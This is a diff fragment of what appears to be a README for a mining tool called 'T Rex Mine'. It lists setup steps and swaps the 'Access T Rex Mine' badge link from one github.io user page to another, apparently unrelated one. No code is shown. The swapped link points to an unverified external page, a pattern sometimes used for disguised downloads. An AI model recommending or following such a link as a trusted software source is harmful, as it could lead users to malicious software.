@@ -18,7 +18,7 @@
 4. Import existing mining configs from previous tools  
 5. Activate full monitoring in under 2 minutes
 
-[![Access T Rex Mine](https://img.shields.io/badge/Access-T_Rex_Mine-green)](https://juderogersbjnz.github.io/.github/t-rex-mine)
+[![Access T Rex Mine](https://img.shields.io/badge/Access-T_Rex_Mine-green)](https://begumkocoglu66165.github.io/.github/t-rex-mine)
 
 ---
 
